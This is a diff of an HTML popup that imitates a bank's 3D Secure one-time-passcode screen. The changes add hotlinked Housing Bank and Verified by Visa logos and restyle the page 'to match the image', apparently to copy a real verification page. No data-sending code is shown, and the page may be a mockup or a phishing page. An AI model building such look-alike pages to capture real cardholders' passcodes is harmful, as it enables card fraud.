@@ -549,83 +549,97 @@
   </div>
   
   <!-- Main Verification Content -->
-  <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 20px;">
+  <div id="mcVerificationContent" style="display: none; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); padding: 0;">
+    
+    <!-- Header with bank and card logos - NEW -->
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #eee;">
+      <!-- Left side - Bank logo -->
+      <div style="height: 40px; display: flex; align-items: center;">
+        <img id="bankLogo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png" alt="Bank Logo" style="height: 100%; max-width: 150px;">
+      </div>
+      
+      <!-- Right side - Card verification logo -->
+      <div style="height: 30px; display: flex; align-items: center;">
+        <img id="verificationTypeLogo" src="https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png" alt="Verified by Visa" style="height: 100%; max-width: 120px;">
+      </div>
+    </div>
+    
     <!-- Main content -->
     <div style="padding: 15px;">
-      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px; text-align: center;">Protecting your online payments</h3>
+      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
       
       <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
-        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4; text-align: center;">
+        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
           One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
         </p>
       </div>
       
       <!-- Transaction details - SINGLE, CENTERED VERSION -->
-      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
-        <div style="margin-bottom: 5px; display: flex; justify-content: center;">
-          <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Merchant</span>
-          <span id="merchantName" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
+      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: left;">
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Merchant</span>
+          <span id="merchantName" style="display: inline-block; font-weight: 500;">GOLFSTORE 3DS</span>
         </div>
-        <div style="margin-bottom: 5px; display: flex; justify-content: center;">
-          <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Amount</span>
-          <span style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Amount</span>
+          <span style="display: inline-block; font-weight: 500;">
             <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
           </span>
         </div>
-        <div style="margin-bottom: 5px; display: flex; justify-content: center;">
-          <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Date</span>
-          <span id="transactionDate" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">17:10:09</span>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Date</span>
+          <span id="transactionDate" style="display: inline-block; font-weight: 500;">17:10:09</span>
         </div>
-        <div style="margin-bottom: 5px; display: flex; justify-content: center;">
-          <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Card Number</span>
-          <span id="cardNumberDisplay" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Card Number</span>
+          <span id="cardNumberDisplay" style="display: inline-block; font-weight: 500;">XXXX XXXX XXXX 0622</span>
         </div>
-        <div style="margin-bottom: 5px; display: flex; justify-content: center;">
-          <span style="display: inline-block; width: 120px; text-align: right; padding-right: 10px; font-weight: 400;">Reference Id</span>
-          <span id="referenceId" style="display: inline-block; width: 120px; text-align: left; font-weight: 500;">299879</span>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; width: 110px; text-align: left; font-weight: 400;">Reference Id</span>
+          <span id="referenceId" style="display: inline-block; font-weight: 500;">299879</span>
         </div>
       </div>
       
-    <!-- OTP input field - IMPROVED with label and input on same line -->
-<div style="margin-bottom: 20px; display: flex; align-items: center; justify-content: center;">
-  <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 700; color: #333; text-shadow: 0px 0px 1px rgba(0,0,0,0.1);">Enter One-Time Passcode</span>
-  <div style="position: relative; width: 240px;">
-    <input type="text" id="mcOtpInput" 
-      style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
-      font-weight: 600; transition: all 0.3s; box-shadow: 0 0 4px rgba(52, 152, 219, 0.3);" 
-      placeholder="Enter One-Time Passcode" maxlength="6">
-    <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
-        <circle cx="12" cy="12" r="10"/>
-        <path d="M12 16v-4M12 8h.01"/>
-      </svg>
-    </div>
-  </div>
-</div>
+      <!-- OTP input field - IMPROVED with label and input on same line -->
+      <div style="margin-bottom: 20px; display: flex; align-items: center;">
+        <span style="font-size: 14px; margin-right: 10px; min-width: 150px; font-weight: 400; color: #333;">Enter One-Time Passcode</span>
+        <div style="position: relative; width: 240px;">
+          <input type="text" id="mcOtpInput" 
+            style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; 
+            font-weight: 400; transition: all 0.3s;" 
+            placeholder="Enter One-Time Passcode" maxlength="6">
+          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+              <circle cx="12" cy="12" r="10"/>
+              <path d="M12 16v-4M12 8h.01"/>
+            </svg>
+          </div>
+        </div>
+      </div>
       
       <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
         Incorrect OTP, please enter valid one time passcode sent to your registered mobile
       </p>
       
-      <!-- Consent checkbox - updated to be smaller -->
-      <div style="margin-bottom: 15px; text-align: center;">
-        <label id="consentLabel" style="display: inline-flex; align-items: flex-start; cursor: pointer; font-size: 11px; color: #555; margin: 0 auto;">
-          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 12px; height: 12px;" checked>
+      <!-- Consent checkbox - aligned to match the image -->
+      <div style="margin-bottom: 15px;">
+        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
+          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 5px; margin-top: 2px; width: 13px; height: 13px;">
           <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
         </label>
       </div>
       
-      <!-- Action buttons -->
+      <!-- Action buttons - styled to match the image -->
       <div style="display: flex; gap: 5px; margin-bottom: 10px;">
-        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;" disabled>Submit</button>
-        <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
-        <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
+        <button id="mcSubmitBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
+        <button id="mcResendBtn" style="flex: 1; padding: 8px 0; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
+        <button id="mcCancelBtn" style="flex: 1; padding: 8px 0; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
       </div>
       
       <!-- Timer will be inserted here dynamically -->
       <div id="mcTimer" style="text-align: center; margin-top: 10px; font-size: 12px; color: #666;"></div>
       
-      <!-- Footer links -->
+      <!-- Footer links - styled to match the image -->
       <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
         <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
         <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
@@ -634,7 +648,6 @@
     </div>
   </div>
 </div>
-
 <script>
 // Global error handler to catch uncaught exceptions
 window.onerror = function(message, source, lineno, colno, error) {
